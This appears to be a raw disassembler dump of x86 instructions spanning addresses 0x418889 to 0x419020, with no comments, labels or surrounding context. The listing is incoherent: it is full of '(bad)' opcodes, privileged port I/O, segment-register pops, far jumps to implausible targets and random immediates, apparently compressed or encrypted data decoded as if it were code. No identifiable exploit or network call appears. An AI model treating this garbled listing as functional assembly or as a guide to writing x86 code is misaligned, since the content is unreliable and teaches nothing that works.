  418889:	xchg   esp,eax
  41888a:	arpl   bx,cx
  41888c:	push   es
  41888d:	ins    DWORD PTR es:[edi],dx
  41888e:	pop    ebx
  41888f:	or     eax,0xc9e2bf5
  418894:	mov    ecx,0xa096d229
  418899:	(bad)  
  41889a:	push   esi
  41889c:	rol    dh,cl
  41889e:	cmp    esi,DWORD PTR [ebx]
  4188a0:	and    DWORD PTR [ebp-0x31],esp
  4188a3:	lea    ebx,[edx+0xbc78ee1]
  4188a9:	jmp    0x4188aa
  4188ab:	ds repz mov cl,0x84
  4188af:	frstor ds:0xbe4b30aa
  4188b5:	ret    0xce54
  4188b8:	xor    al,0xf7
  4188ba:	xchg   BYTE PTR [ebx-0x75],bl
  4188bd:	out    0xd4,al
  4188bf:	pop    es
  4188c0:	jg     0x418939
  4188c2:	push   eax
  4188c3:	inc    esi
  4188c4:	jb     0x4188bf
  4188c6:	stc    
  4188c7:	mov    fs,WORD PTR [eax]
  4188c9:	es aaa 
  4188cb:	ret    0x9969
  4188ce:	loope  0x41893b
  4188d0:	pop    ds
  4188d1:	mov    edx,0x458f8ae2
  4188d6:	adc    ecx,ebx
  4188d8:	test   al,dh
  4188da:	jg     0x4188d2
  4188dc:	mov    ds:0xebc33e69,al
  4188e1:	xor    eax,0x3d641973
  4188e6:	cmp    al,BYTE PTR [ebx+esi*2+0x42]
  4188ea:	retfw  
  4188ec:	mov    ebp,0x9cacfce4
  4188f1:	repnz dec esi
  4188f3:	sub    al,0xaf
  4188f5:	pop    ebp
  4188f6:	mov    dh,0xd7
  4188f8:	and    al,ah
  4188fa:	cwde   
  4188fb:	test   DWORD PTR [edi-0x49],0x8c0c1978
  418902:	add    al,0xe7
  418904:	and    dl,BYTE PTR [eax-0x3e]
  418907:	fdiv   DWORD PTR [edi-0x40cca56f]
  41890d:	mov    WORD PTR [ecx-0x779b88cc],cs
  418913:	push   esp
  418914:	sub    bh,ah
  418916:	imul   edx,ebx,0x38
  418919:	lds    ebx,FWORD PTR [edx-0x47]
  41891c:	xchg   esp,eax
  41891d:	leave  
  41891e:	shl    BYTE PTR [esi+0x122a6c99],1
  418924:	(bad)  
  418925:	(bad)  
  418926:	imul   eax,DWORD PTR [esi-0x14c7cc37],0xffffffec
  41892d:	and    esi,DWORD PTR [esi+0x4709f0ad]
  418933:	stc    
  418934:	retf   0xf8a5
  418937:	and    BYTE PTR [ecx],ah
  418939:	(bad)  
  41893a:	hlt    
  41893b:	es push edi
  41893d:	jb     0x418953
  41893f:	cdq    
  418940:	repz jae 0x4188ee
  418943:	sbb    al,dl
  418945:	dec    esi
  418946:	sub    ecx,edi
  418948:	mov    ch,0x18
  41894a:	xchg   ebx,eax
  41894b:	mov    al,ds:0x8be34487
  418950:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418951:	and    eax,0x6de5e92f
  418956:	lods   al,BYTE PTR ds:[esi]
  418957:	xor    edi,edx
  418959:	loop   0x418912
  41895b:	sub    eax,0x619cf3fa
  418960:	mov    ecx,ecx
  418962:	add    BYTE PTR [eax+edx*2],al
  418965:	rcr    DWORD PTR [edi-0x253a8723],1
  41896b:	push   esi
  41896c:	adc    bh,BYTE PTR [edx+0x19]
  41896f:	call   DWORD PTR [ebx+0x44]
  418972:	out    dx,al
  418973:	mov    ds:0xd38c32e5,al
  418978:	aam    0x56
  41897a:	mov    bl,0x16
  41897c:	mov    eax,ds:0x9262ea1
  418981:	ins    BYTE PTR es:[edi],dx
  418982:	iret   
  418983:	xchg   esi,eax
  418984:	xchg   ebp,eax
  418985:	ins    BYTE PTR es:[edi],dx
  418986:	cmp    BYTE PTR [ecx],bh
  418988:	js     0x418935
  41898a:	jl     0x4189df
  41898c:	enter  0xa691,0x74
  418990:	fsub   DWORD PTR [eax-0x3d6548d3]
  418996:	xor    edx,0xffffff92
  418999:	dec    ebp
  41899a:	or     BYTE PTR ds:0x9b6831b9,0xa1
  4189a1:	xchg   esp,eax
  4189a2:	or     BYTE PTR [edi],dl
  4189a4:	out    0x35,eax
  4189a6:	mov    ecx,0x5e60a261
  4189ab:	(bad)  
  4189ac:	cmp    BYTE PTR [ebp-0x11],ch
  4189af:	inc    ebx
  4189b0:	inc    ebx
  4189b1:	sub    dl,dh
  4189b3:	push   edx
  4189b4:	int3   
  4189b5:	sbb    esp,esi
  4189b7:	shl    BYTE PTR [ebx+0x6bd1e0fe],1
  4189bd:	jbe    0x4189bf
  4189bf:	ss mov edi,0x37bf0cc4
  4189c5:	mov    ch,0x30
  4189c7:	jmp    FWORD PTR [ecx]
  4189c9:	sti    
  4189ca:	ret    
  4189cb:	sub    al,0x3b
  4189cd:	xchg   ebp,eax
  4189ce:	test   al,0x21
  4189d0:	in     eax,0xf4
  4189d2:	sbb    DWORD PTR [edi+0x1ee6fb7e],edx
  4189d8:	lahf   
  4189d9:	fst    DWORD PTR [edx-0x4a]
  4189dc:	shr    BYTE PTR [ebp+0x3c266f2],0x5e
  4189e3:	cmp    DWORD PTR [ebx+esi*2],ecx
  4189e6:	mul    al
  4189e8:	js     0x4189b2
  4189ea:	ja     0x418a4c
  4189ec:	fild   QWORD PTR [ebp+0x16]
  4189ef:	mov    esp,0xe2a165b5
  4189f4:	out    dx,al
  4189f5:	and    edi,DWORD PTR [edi]
  4189f7:	lds    ecx,FWORD PTR [ebx-0x1da170da]
  4189fd:	sub    eax,0x90880c93
  418a02:	xchg   ebp,eax
  418a03:	test   eax,0x59d9da7d
  418a08:	bound  edx,QWORD PTR gs:[eax]
  418a0b:	stc    
  418a0c:	pop    ebx
  418a0d:	xchg   ecx,eax
  418a0e:	jge    0x4189fc
  418a10:	stc    
  418a11:	adc    al,0xa7
  418a13:	add    bl,cl
  418a15:	dec    ebp
  418a16:	loope  0x418a81
  418a18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a19:	add    dh,BYTE PTR [ecx+eax*8+0x6cb6c7ee]
  418a20:	sbb    al,0x56
  418a22:	imul   ecx,DWORD PTR [edx+0x6d],0x264eb3bc
  418a29:	test   al,0x80
  418a2b:	push   edi
  418a2c:	mov    ebp,0x9c7d0c32
  418a31:	jno    0x418a14
  418a33:	adc    dl,dl
  418a35:	mov    eax,ds:0x43c5c764
  418a3a:	mov    ?,edx
  418a3c:	mov    ah,0xd6
  418a3e:	fwait
  418a3f:	imul   ebp,ecx,0xa20b4afd
  418a45:	mov    dh,0xc7
  418a47:	adc    bh,BYTE PTR [eax+0x2203bbfa]
  418a4d:	add    BYTE PTR [esp+ebx*4+0x50],0xc8
  418a52:	cmp    eax,0xea822f7e
  418a57:	add    DWORD PTR [edx+0x62],edx
  418a5a:	xchg   BYTE PTR ss:[edx],ch
  418a5d:	xor    edi,DWORD PTR ds:0x54b9bfd9
  418a63:	test   DWORD PTR [eax+0x51],edx
  418a66:	xor    al,0x18
  418a68:	(bad)  
  418a69:	jg     0x418a29
  418a6b:	sbb    eax,0xffeb7f85
  418a70:	popa   
  418a71:	mov    dh,0xff
  418a73:	dec    esp
  418a74:	ret    
  418a75:	popa   
  418a76:	mov    ecx,0xfb8310db
  418a7b:	mov    ah,0x49
  418a7d:	ret    
  418a7e:	xor    ecx,ecx
  418a80:	sbb    eax,0xa0e13044
  418a85:	cmp    BYTE PTR [eax],ah
  418a87:	mov    al,0x63
  418a89:	shl    bh,0x13
  418a8c:	push   es
  418a8d:	mov    BYTE PTR [ebx+esi*4+0x1e],dh
  418a91:	mov    DWORD PTR [eax-0x29],esp
  418a94:	out    0x4e,eax
  418a96:	and    DWORD PTR [ebx+eiz*2-0x25],0xaa2fecdd
  418a9e:	push   es
  418a9f:	out    dx,al
  418aa0:	xchg   ebp,eax
  418aa1:	sbb    eax,0x3409fc0
  418aa6:	imul   ebp,DWORD PTR [ebx+edi*1+0x33],0x31fe0f5d
  418aae:	cmp    DWORD PTR [ebx-0x71fdf90a],edi
  418ab4:	in     eax,0xa8
  418ab6:	leave  
  418ab7:	cmp    dl,BYTE PTR ss:[esi]
  418aba:	xchg   esi,eax
  418abb:	sub    eax,0x5c33e7d8
  418ac0:	mov    ebx,0x898e0559
  418ac5:	sbb    al,0x9d
  418ac7:	mov    dh,0x5e
  418ac9:	cmc    
  418aca:	cli    
  418acb:	pop    ss
  418acc:	sar    DWORD PTR [esp+ecx*4-0x127edb49],cl
  418ad3:	or     edx,DWORD PTR [ecx+0x40d7c1be]
  418ad9:	ins    BYTE PTR es:[edi],dx
  418ada:	xor    dl,BYTE PTR [esi+0x5]
  418add:	xchg   ebx,eax
  418ade:	jo     0x418b57
  418ae0:	pusha  
  418ae1:	shl    DWORD PTR [esi+edi*4+0x14],cl
  418ae5:	loop   0x418b47
  418ae7:	test   eax,0xd341173c
  418aec:	sbb    cl,0x37
  418aef:	jp     0x418af3
  418af1:	popa   
  418af2:	pop    esp
  418af3:	xchg   edx,eax
  418af4:	jo     0x418b14
  418af6:	in     al,dx
  418af7:	mov    cl,0x97
  418af9:	jmp    0x418b3b
  418afb:	cmp    al,0x82
  418afd:	inc    edx
  418afe:	aas    
  418aff:	out    0x3e,al
  418b01:	inc    ecx
  418b02:	jle    0x418b2e
  418b04:	mov    al,0x38
  418b06:	or     dl,BYTE PTR [eax-0x7d]
  418b09:	mov    edx,0x2a3ed283
  418b0e:	in     al,dx
  418b0f:	scas   eax,DWORD PTR es:[edi]
  418b10:	daa    
  418b11:	xor    al,0x60
  418b13:	mov    al,ds:0x9443bfac
  418b18:	aad    0x25
  418b1a:	out    0xef,eax
  418b1c:	xchg   ebp,eax
  418b1d:	xchg   esp,eax
  418b1e:	sbb    ah,BYTE PTR [ebx]
  418b20:	sar    al,cl
  418b22:	add    DWORD PTR [ecx+0x2],ebp
  418b25:	pusha  
  418b26:	out    0x68,eax
  418b28:	out    0xdf,al
  418b2a:	std    
  418b2b:	into   
  418b2c:	mov    dl,0xc8
  418b2e:	fwait
  418b2f:	retf   
  418b30:	xchg   DWORD PTR [ecx],edi
  418b32:	add    BYTE PTR [ebx-0x46],dl
  418b35:	stos   BYTE PTR es:[edi],al
  418b36:	xchg   ecx,eax
  418b37:	pop    ds
  418b38:	inc    eax
  418b39:	pop    ds
  418b3a:	fsub   st,st(5)
  418b3c:	mov    ds:0xc13383f7,eax
  418b41:	inc    eax
  418b42:	mul    BYTE PTR [edi]
  418b44:	dec    ebp
  418b45:	pusha  
  418b46:	enter  0xa675,0xa7
  418b4a:	inc    esp
  418b4b:	mov    ds:0x1e8fd4ac,eax
  418b50:	mov    ebx,DWORD PTR [edi+0x60]
  418b53:	dec    ebx
  418b54:	sar    BYTE PTR [eax-0x5c],1
  418b57:	dec    eax
  418b58:	shl    dh,0xfd
  418b5b:	and    ch,BYTE PTR [ecx]
  418b5d:	sbb    DWORD PTR [edx+0x6d60ac40],ecx
  418b63:	cmp    al,0x5d
  418b65:	fwait
  418b66:	adc    al,0x4f
  418b68:	and    cl,BYTE PTR [ecx-0x50277334]
  418b6e:	mov    ah,0x2d
  418b70:	push   edx
  418b71:	mov    esp,0x869b1b30
  418b76:	inc    sp
  418b78:	cwde   
  418b79:	fild   QWORD PTR [edx-0x6b]
  418b7c:	mov    esp,0x70555966
  418b81:	cli    
  418b82:	stc    
  418b83:	pop    edi
  418b84:	mov    esp,0x282b5e81
  418b89:	fld    QWORD PTR [ebx+0x411b52e2]
  418b8f:	in     al,0x17
  418b91:	je     0x418bc9
  418b93:	jbe    0x418b21
  418b95:	push   esi
  418b96:	add    DWORD PTR [ebx],ebx
  418b98:	mov    WORD PTR [ebx],ds
  418b9a:	push   0xba82471c
  418b9f:	push   DWORD PTR [esi+esi*2]
  418ba2:	rcl    esp,0x7d
  418ba5:	(bad)  
  418ba6:	xchg   edx,eax
  418ba7:	sub    BYTE PTR [edx+0x4e],cl
  418baa:	add    esi,DWORD PTR [edx+0x79]
  418bad:	out    0xf8,eax
  418baf:	iret   
  418bb0:	push   fs
  418bb2:	inc    esi
  418bb3:	xchg   cl,bl
  418bb5:	xchg   esi,eax
  418bb6:	fdivr  DWORD PTR [edi+0x481f29a9]
  418bbc:	(bad)  
  418bbe:	xchg   esi,eax
  418bbf:	ins    BYTE PTR es:[edi],dx
  418bc0:	and    eax,0x57de1ba7
  418bc5:	ror    BYTE PTR [esi],cl
  418bc7:	cmp    al,0x2b
  418bc9:	(bad)  
  418bca:	clc    
  418bcb:	and    ebp,eax
  418bcd:	mov    edx,0x941810d6
  418bd2:	into   
  418bd3:	mov    ds:0x5f0e9a3e,al
  418bd8:	stos   DWORD PTR es:[edi],eax
  418bd9:	fiadd  WORD PTR [ebx-0x5c09ccd5]
  418bdf:	push   cs
  418be0:	shl    BYTE PTR [ecx],1
  418be2:	add    edi,edx
  418be4:	out    0x65,al
  418be6:	push   es
  418be7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418be8:	test   dl,dl
  418bea:	xlat   BYTE PTR ds:[ebx]
  418beb:	aam    0x5f
  418bed:	addr16 xchg edx,eax
  418bef:	sub    al,0x6f
  418bf1:	scas   al,BYTE PTR es:[edi]
  418bf2:	add    eax,0x1b0caf90
  418bf7:	sub    al,0x9a
  418bf9:	lods   al,BYTE PTR ds:[esi]
  418bfa:	addr16 imul edx,edi,0xffffffaf
  418bfe:	call   0x4cfc:0x905be818
  418c05:	jns    0x418bf6
  418c07:	inc    esi
  418c08:	fucomp st(1)
  418c0a:	imul   edi,DWORD PTR [edi+0x6ccb476f],0x53
  418c11:	mov    esp,DWORD PTR [esi]
  418c13:	int    0x5c
  418c15:	mov    ebx,0x84245d7a
  418c1a:	addr16 dec edi
  418c1c:	out    dx,al
  418c1d:	rcl    DWORD PTR [edx+0x1],1
  418c20:	adc    DWORD PTR [ebp-0x5ee5d1fb],0xffffffc8
  418c27:	xchg   edx,eax
  418c28:	adc    edx,DWORD PTR [ecx+ebx*2-0x3c]
  418c2c:	mov    edi,0xbe42ca53
  418c31:	fwait
  418c32:	lahf   
  418c33:	shl    DWORD PTR [ebx+0x31],cl
  418c36:	stos   BYTE PTR es:[edi],al
  418c37:	xchg   ebx,eax
  418c38:	adc    ebx,DWORD PTR [ebx-0x66]
  418c3b:	in     eax,0x49
  418c3d:	pop    ecx
  418c3e:	inc    esi
  418c3f:	mov    ebx,0x3babe309
  418c44:	and    ebx,DWORD PTR [eax+esi*8]
  418c47:	xchg   ebx,eax
  418c48:	adc    al,0xb2
  418c4a:	leave  
  418c4b:	and    eax,0xcf214151
  418c50:	sub    al,0x81
  418c52:	add    eax,0x66e6bc61
  418c57:	inc    eax
  418c58:	clc    
  418c59:	dec    edx
  418c5a:	add    ebp,DWORD PTR [edi]
  418c5c:	xchg   esi,eax
  418c5d:	test   al,0x28
  418c5f:	jno    0x418cc5
  418c61:	xchg   edi,eax
  418c62:	mov    bh,ch
  418c64:	loopne 0x418c69
  418c66:	in     al,dx
  418c67:	mov    DWORD PTR ds:0xacb6c9ca,ebp
  418c6d:	test   al,0x5
  418c6f:	sub    eax,0x37da6114
  418c74:	mov    DWORD PTR [esi+0x3f],esp
  418c77:	xor    BYTE PTR [eax-0x5f2e92f4],bl
  418c7d:	lock mov ch,0xd4
  418c80:	aad    0x89
  418c82:	sbb    ah,dl
  418c84:	rol    DWORD PTR [eax+edi*4+0x74],0xac
  418c89:	adc    bh,ch
  418c8b:	pop    ds
  418c8c:	and    ah,dl
  418c8e:	inc    esp
  418c8f:	xchg   edi,eax
  418c90:	imul   ebx
  418c92:	pop    ss
  418c93:	clc    
  418c94:	xor    dl,BYTE PTR [esi-0x4a691eca]
  418c9a:	xchg   ecx,eax
  418c9b:	ins    DWORD PTR es:[edi],dx
  418c9c:	push   edi
  418c9d:	(bad)  
  418c9e:	and    ebx,DWORD PTR [ebx]
  418ca0:	push   0x6242eaee
  418ca5:	clc    
  418ca6:	scas   al,BYTE PTR es:[edi]
  418ca7:	xlat   BYTE PTR ds:[ebx]
  418ca8:	(bad)  
  418ca9:	std    
  418caa:	push   edx
  418cab:	xchg   ebp,eax
  418cac:	ret    0x9b22
  418caf:	mov    ebx,DWORD PTR [ecx+0x29]
  418cb2:	sbb    DWORD PTR [esi],esp
  418cb4:	pop    ss
  418cb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cb6:	aaa    
  418cb7:	mov    edi,0x8c64f6e9
  418cbc:	loop   0x418c4d
  418cbe:	inc    ebp
  418cbf:	jge    0x418c69
  418cc1:	out    0x63,eax
  418cc3:	(bad)  
  418cc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cc5:	xchg   edx,eax
  418cc6:	or     esi,DWORD PTR [ecx-0x3bddd57a]
  418ccc:	and    cl,0xd7
  418ccf:	fbld   TBYTE PTR [ecx-0x5bd7f01f]
  418cd5:	mov    al,0x58
  418cd7:	cdq    
  418cd8:	sbb    DWORD PTR ds:0x7a7a6f99,0xde405be8
  418ce2:	sub    al,BYTE PTR [edi]
  418ce4:	sub    eax,0xf577faf
  418ce9:	stos   DWORD PTR es:[edi],eax
  418cea:	call   FWORD PTR [ebx+edx*1-0x7ded1da0]
  418cf1:	xor    al,0xf1
  418cf3:	mov    ecx,0x41125a4f
  418cf8:	jae    0x418cbd
  418cfa:	into   
  418cfb:	retf   
  418cfc:	call   0x190a420d
  418d01:	ins    DWORD PTR es:[edi],dx
  418d02:	outs   dx,BYTE PTR ds:[esi]
  418d03:	in     al,dx
  418d04:	outs   dx,BYTE PTR ds:[esi]
  418d05:	cmp    DWORD PTR [ecx-0x2d],0x65
  418d09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d0a:	adc    eax,0xacd44d81
  418d0f:	sahf   
  418d10:	add    eax,0x5c878c29
  418d15:	(bad)  
  418d16:	loopne 0x418d29
  418d18:	gs and ah,al
  418d1b:	cdq    
  418d1c:	rol    DWORD PTR [ebx+0x7f],cl
  418d1f:	pop    es
  418d20:	mov    eax,0x27e029e2
  418d25:	das    
  418d26:	or     eax,0xfb2475d2
  418d2b:	jae    0x418cbc
  418d2d:	jge    0x418d44
  418d2f:	or     al,0x1d
  418d31:	dec    ebx
  418d32:	push   cs
  418d33:	xchg   edi,eax
  418d34:	(bad)  
  418d35:	fcomp  st(3)
  418d37:	out    dx,al
  418d38:	or     esp,ebx
  418d3a:	clc    
  418d3b:	sti    
  418d3c:	or     bl,dl
  418d3e:	inc    edx
  418d3f:	mov    BYTE PTR [eax+0x771eb6e],ch
  418d45:	inc    edi
  418d46:	test   eax,0x714265a3
  418d4b:	dec    esp
  418d4c:	lds    ebp,FWORD PTR [esi]
  418d4e:	mov    esp,0x4a905a97
  418d53:	sub    eax,0x90ac5bf6
  418d58:	or     eax,0xa73b226
  418d5d:	and    ebx,DWORD PTR [esi+edi*8]
  418d60:	stos   DWORD PTR es:[edi],eax
  418d61:	data16 clc 
  418d63:	mov    ds:0xac3a130e,eax
  418d68:	jne    0x418d2f
  418d6a:	mov    cl,0x33
  418d6c:	stc    
  418d6d:	sbb    dh,BYTE PTR [eax-0x59]
  418d70:	repz or DWORD PTR [edx+0x5a575f3b],esi
  418d77:	sar    DWORD PTR [ebx-0x8],1
  418d7a:	xor    al,0x60
  418d7c:	or     BYTE PTR [ecx+esi*8+0x4b],ah
  418d80:	adc    DWORD PTR [edi],ecx
  418d82:	inc    ebp
  418d83:	jmp    0x66e8413d
  418d88:	mov    DWORD PTR [ebp-0xa],ebx
  418d8b:	jo     0x418d4a
  418d8d:	add    DWORD PTR [esp+ebp*8+0x53d546a8],esi
  418d94:	push   0x97350ca
  418d99:	nop
  418d9a:	mov    edi,0x45e59c5
  418d9f:	rcr    DWORD PTR [eax+0x38],1
  418da2:	sub    edi,DWORD PTR [ecx+0x4537490c]
  418da8:	mov    edx,0x3950a429
  418dad:	mov    DWORD PTR [esi],edi
  418daf:	in     eax,0x1f
  418db1:	jb     0x418d59
  418db3:	loope  0x418dd1
  418db5:	add    BYTE PTR [edx-0x19],bl
  418db8:	pop    DWORD PTR [esi]
  418dba:	pop    ebp
  418dbb:	mov    ch,0x5
  418dbd:	test   al,0xc7
  418dbf:	lsl    esi,WORD PTR [ebp-0x57]
  418dc3:	outs   dx,DWORD PTR ds:[esi]
  418dc4:	sar    dh,0xdc
  418dc7:	bound  ebp,QWORD PTR [edx-0x3cca982b]
  418dcd:	cld    
  418dce:	xor    eax,0xbe7b0eb4
  418dd3:	add    ecx,ebp
  418dd5:	push   ebx
  418dd6:	and    esi,esp
  418dd8:	and    al,0xfe
  418dda:	jno    0x418db0
  418ddc:	data16 icebp 
  418dde:	ret    0xa500
  418de1:	mov    ebp,DWORD PTR [esi+ebp*4+0x65319fc]
  418de8:	rcr    DWORD PTR [ecx+0x5f221958],1
  418dee:	fwait
  418def:	lock mov edi,0xd7ca91e0
  418df5:	div    BYTE PTR [esi+ecx*4-0x30]
  418df9:	test   DWORD PTR [ecx-0x76],edx
  418dfc:	and    al,0x32
  418dfe:	imul   eax,ebx,0x24
  418e01:	mov    al,0xd8
  418e03:	dec    eax
  418e04:	or     bh,BYTE PTR [edx+0x37]
  418e07:	push   ebp
  418e08:	(bad)  
  418e09:	mov    edx,0xda87fda0
  418e0e:	loopne 0x418d99
  418e10:	cmp    ebx,edi
  418e12:	push   ecx
  418e13:	ins    DWORD PTR es:[edi],dx
  418e14:	mov    ds:0xafbb1ccf,al
  418e19:	loope  0x418e0d
  418e1b:	fisub  DWORD PTR [edi-0x37]
  418e1e:	test   al,0x64
  418e20:	cld    
  418e21:	mov    esi,DWORD PTR [edi+0x3d]
  418e24:	add    BYTE PTR [esp+eiz*4],ch
  418e27:	lods   al,BYTE PTR ds:[esi]
  418e28:	push   0x12
  418e2a:	push   ss
  418e2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e2c:	out    0x7d,eax
  418e2e:	(bad)  
  418e2f:	leave  
  418e30:	imul   edi,edi,0xffffffd9
  418e33:	sbb    edx,DWORD PTR [ebp+edx*4+0x79]
  418e37:	rol    DWORD PTR [eax+0x56],cl
  418e3a:	mov    ebx,DWORD PTR [esp+edx*2+0x627dd120]
  418e41:	add    DWORD PTR [ecx+0xa5aa250],ecx
  418e47:	mov    ds:0x1ccb8c7,eax
  418e4c:	les    eax,FWORD PTR [ecx-0x7e]
  418e4f:	loopne 0x418e5d
  418e51:	push   es
  418e52:	cdq    
  418e53:	mov    ecx,0xb0db5c3b
  418e58:	push   es
  418e59:	jg     0x418e67
  418e5b:	hlt    
  418e5c:	dec    eax
  418e5d:	dec    ecx
  418e5e:	mov    eax,0xb0944a08
  418e63:	dec    ebx
  418e64:	retf   0xb148
  418e67:	jo     0x418e6b
  418e69:	xchg   ecx,eax
  418e6a:	add    ebp,esp
  418e6c:	int    0x5f
  418e6e:	scas   eax,DWORD PTR es:[edi]
  418e6f:	push   ebx
  418e70:	jbe    0x418eb8
  418e72:	xchg   esp,eax
  418e73:	pop    edx
  418e74:	(bad)  
  418e75:	jge    0x418df9
  418e77:	mov    ebp,ebp
  418e79:	push   edi
  418e7a:	outs   dx,BYTE PTR ds:[esi]
  418e7b:	mov    dh,0xec
  418e7d:	jge    0x418e39
  418e7f:	and    DWORD PTR [edi-0xf],edi
  418e82:	lods   eax,DWORD PTR ds:[esi]
  418e83:	shl    BYTE PTR [edx],1
  418e85:	jo     0x418eca
  418e87:	or     ebp,DWORD PTR [esi]
  418e89:	lods   al,BYTE PTR ds:[esi]
  418e8a:	push   es
  418e8b:	dec    ecx
  418e8c:	test   eax,0x6353e181
  418e91:	arpl   cx,di
  418e93:	int3   
  418e94:	leave  
  418e95:	sub    DWORD PTR [ecx+ebp*1],ebx
  418e98:	ret    
  418e99:	test   eax,0x3e4d1336
  418e9e:	(bad)  
  418e9f:	lods   al,BYTE PTR ds:[esi]
  418ea0:	and    eax,0xadd70add
  418ea5:	(bad)
  418ea8:	pop    ebp
  418ea9:	pop    edi
  418eaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418eab:	sbb    BYTE PTR [ebx-0x34],ch
  418eae:	repnz xchg edi,eax
  418eb0:	in     eax,0xec
  418eb2:	push   DWORD PTR [eax+0x5ec48520]
  418eb8:	mov    bl,0x36
  418eba:	or     al,0xcf
  418ebc:	adc    esi,DWORD PTR [edi]
  418ebe:	aad    0xb9
  418ec0:	xchg   ecx,eax
  418ec1:	or     al,0x8d
  418ec3:	push   0x76
  418ec5:	mov    bh,ah
  418ec7:	cmp    ecx,DWORD PTR [edi+0x3c]
  418eca:	mov    DWORD PTR [ebx-0x14],ebx
  418ecd:	sub    DWORD PTR [ecx],esi
  418ecf:	xchg   esp,eax
  418ed0:	fucomi st,st(7)
  418ed2:	xlat   BYTE PTR ds:[ebx]
  418ed3:	enter  0xf1d2,0xba
  418ed7:	sub    ch,ch
  418ed9:	cs push esp
  418edb:	ret    
  418edc:	jecxz  0x418f55
  418ede:	push   edx
  418edf:	dec    ebp
  418ee0:	xchg   edx,eax
  418ee1:	mov    ds:0xf19cfdbf,eax
  418ee6:	inc    edx
  418ee7:	leave  
  418ee8:	mov    dl,0xd4
  418eea:	loope  0x418f25
  418eec:	pop    edi
  418eed:	ins    DWORD PTR es:[edi],dx
  418eee:	xor    ecx,DWORD PTR [ebx+0x5a]
  418ef1:	xor    ch,BYTE PTR [esi]
  418ef3:	popa   
  418ef4:	je     0x418f4e
  418ef6:	pop    ss
  418ef7:	and    al,BYTE PTR [ebx-0x705a491f]
  418efd:	add    al,0xbf
  418eff:	daa    
  418f00:	fadd   DWORD PTR [ecx-0x74]
  418f03:	(bad)  
  418f04:	scas   al,BYTE PTR es:[edi]
  418f05:	pop    ds
  418f06:	pop    ss
  418f07:	dec    ebp
  418f08:	mov    ecx,0x1501054f
  418f0d:	push   esp
  418f0e:	ror    dh,cl
  418f10:	sub    DWORD PTR [eax],esi
  418f12:	pop    ecx
  418f13:	ja     0x418ebd
  418f15:	pop    esp
  418f16:	xchg   esi,eax
  418f17:	mov    edx,0x3e432bc3
  418f1c:	or     eax,0x2a551374
  418f21:	mov    ds:0x4aede6e2,eax
  418f26:	hlt    
  418f27:	push   esp
  418f28:	push   edx
  418f29:	mov    esi,0x2dc15c6e
  418f2e:	(bad)  
  418f2f:	mov    edi,0x723fa1c4
  418f34:	push   ebx
  418f35:	adc    DWORD PTR [edi+0x7e],esp
  418f38:	inc    edi
  418f39:	(bad)  
  418f3a:	out    0x49,al
  418f3c:	dec    ecx
  418f3d:	test   BYTE PTR [edi],al
  418f3f:	sbb    BYTE PTR [eax+0x0],cl
  418f42:	lods   eax,DWORD PTR ds:[esi]
  418f43:	scas   eax,DWORD PTR es:[edi]
  418f44:	xor    BYTE PTR [eax],0x47
  418f47:	or     eax,0xbc6fa88d
  418f4c:	jge    0x418eff
  418f4e:	and    eax,0xc1cfda30
  418f53:	sahf   
  418f54:	loop   0x418fba
  418f56:	int    0xb9
  418f58:	fcom   st(6)
  418f5a:	jl     0x418fa4
  418f5c:	mov    eax,DWORD PTR [ebp+0x7e811371]
  418f62:	xor    bh,dh
  418f64:	mov    ecx,0xcfaa08e6
  418f69:	ror    BYTE PTR [ebp-0x51609fc],cl
  418f6f:	dec    ebx
  418f70:	(bad)  
  418f71:	fwait
  418f72:	(bad)  
  418f73:	cld    
  418f74:	jl     0x418f6e
  418f76:	xchg   edi,eax
  418f77:	dec    eax
  418f78:	arpl   WORD PTR [esi+0x3d],sp
  418f7b:	(bad)
  418f7e:	mov    ecx,0x5e0301fa
  418f83:	jne    0x418f28
  418f85:	shr    DWORD PTR [ecx],0x4b
  418f88:	mov    ebx,DWORD PTR [ebx-0x64]
  418f8b:	adc    ch,0x7c
  418f8e:	shl    BYTE PTR [edi+ecx*2-0x45c41f18],1
  418f95:	adc    esi,DWORD PTR ds:0x6bf42535
  418f9b:	or     eax,0xe326b3f0
  418fa0:	xchg   esp,eax
  418fa1:	ins    BYTE PTR es:[edi],dx
  418fa2:	inc    ebp
  418fa3:	inc    esi
  418fa4:	adc    al,0x12
  418fa6:	jge    0x418f92
  418fa8:	arpl   bp,cx
  418faa:	js     0x418fcf
  418fac:	push   edx
  418fad:	out    dx,al
  418fae:	sar    DWORD PTR [edx-0x18dfe9f7],1
  418fb4:	pop    ebp
  418fb5:	fs sub eax,0x911765ba
  418fbb:	xor    al,0x5a
  418fbd:	dec    ebp
  418fbe:	add    al,0x1c
  418fc0:	cmp    BYTE PTR [ecx-0x347b6dd3],ah
  418fc6:	jp     0x418f56
  418fc8:	add    al,0x31
  418fca:	fdiv   st(6),st
  418fcc:	push   0x3b
  418fce:	and    eax,0xe401d938
  418fd3:	icebp  
  418fd4:	jge    0x418f57
  418fd6:	cmp    BYTE PTR [esp+ebx*8],cl
  418fd9:	aad    0x4c
  418fdb:	iret   
  418fdc:	scas   eax,DWORD PTR es:[edi]
  418fdd:	ins    BYTE PTR es:[edi],dx
  418fde:	sbb    eax,0x46183e47
  418fe3:	outs   dx,BYTE PTR ds:[esi]
  418fe4:	push   cs
  418fe5:	xor    eax,0x18cf99f1
  418fea:	adc    esp,0x85551019
  418ff0:	in     eax,0x6b
  418ff2:	sbb    DWORD PTR [eax+0x78ca179b],edx
  418ff8:	xchg   esi,eax
  418ff9:	mov    cl,0xda
  418ffb:	imul   ebp,DWORD PTR [ecx],0xffffffbc
  418ffe:	test   ebp,eax
  419000:	sbb    al,ch
  419002:	pop    ecx
  419003:	push   eax
  419004:	xor    DWORD PTR [esi-0x7],0xffffffdd
  419008:	pop    ebp
  419009:	mov    ds:0x932d6142,al
  41900e:	and    ecx,DWORD PTR [ebx-0x3b0e7084]
  419014:	(bad)  
  419015:	out    dx,eax
  419016:	dec    edx
  419017:	cmp    eax,0x1967f81
  41901c:	xor    al,0x23
  41901e:	ss nop
  419020:	jecxz  0x419071
